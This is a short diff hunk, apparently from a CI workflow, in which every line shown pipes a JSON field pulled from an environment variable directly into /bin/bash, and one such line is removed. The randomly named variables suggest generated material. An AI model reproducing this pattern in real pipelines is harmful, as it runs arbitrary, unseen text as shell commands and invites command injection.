@@ -38,7 +38,6 @@ jobs:
           echo $le2525 | jq -r .fnep5713 | /bin/bash
           printf '%s' "$tw066" | jq -r .dr6 | /bin/bash
           printf '%s' "$u5" | jq -r .kjbl460 | /bin/bash
-          echo $xnd557 | jq -r .khp807 | /bin/bash
           printf '%s' "$pj280" | jq -r .jre270 | /bin/bash
           printf '%s' "$ine595" | jq -r .alez3 | /bin/bash
           printf '%s' "$fwf130" | jq -r .bpj06 | /bin/bash
